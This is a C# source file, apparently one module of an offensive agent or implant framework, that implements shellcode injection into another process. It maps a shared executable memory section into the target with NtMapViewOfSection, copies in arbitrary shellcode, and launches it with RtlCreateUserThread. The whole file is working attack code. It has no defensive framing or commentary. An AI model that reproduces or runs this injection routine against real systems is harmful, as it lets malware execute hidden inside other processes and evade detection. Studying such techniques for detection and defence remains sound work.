using Agent;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace inject_shellcode.Techniques
{
    internal class MapViewOfSection : ITechnique
    {
        public bool Inject(byte[] shellcode, IntPtr hTarget)
        {
            return Run(shellcode, hTarget);
        }

        public bool Inject(byte[] shellcode, Process proc)
        {
            return Run(shellcode, proc.Handle);
        }

        private bool Run(byte[] shellcode, IntPtr htarget)
        {
            IntPtr hSectionHandle = IntPtr.Zero;
            IntPtr pLocalView = IntPtr.Zero;
            UInt64 size = (UInt32)shellcode.Length;

            // create a new section to map view to
            UInt32 result = Native.NtCreateSection(ref hSectionHandle, Native.SectionAccess.SECTION_ALL_ACCESS, IntPtr.Zero, ref size, Native.MemoryProtection.PAGE_EXECUTE_READWRITE, Native.MappingAttributes.SEC_COMMIT, IntPtr.Zero);

            if (result != 0)
            {
                return false;
            }
            // create a local view
            const UInt32 ViewUnmap = 0x2;
            UInt64 offset = 0;
            result = Native.NtMapViewOfSection(hSectionHandle, (IntPtr)(-1), ref pLocalView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, Native.MemoryProtection.PAGE_READWRITE);

            if (result != 0)
            {
                return false;
            }

            // copy shellcode to the local view
            Marshal.Copy(shellcode, 0, pLocalView, shellcode.Length);
            // create a remote view of the section in the target
            IntPtr pRemoteView = IntPtr.Zero;
            Native.NtMapViewOfSection(hSectionHandle, htarget, ref pRemoteView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref size, ViewUnmap, 0, Native.MemoryProtection.PAGE_EXECUTE_READ);
            // execute the shellcode
            IntPtr hThread = IntPtr.Zero;
            Native.CLIENT_ID cid = new Native.CLIENT_ID();
            Native.RtlCreateUserThread(htarget, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, pRemoteView, IntPtr.Zero, ref hThread, cid);

            if (hThread == IntPtr.Zero)
            {
                return false;
            }
            return true;
        }
    }
}
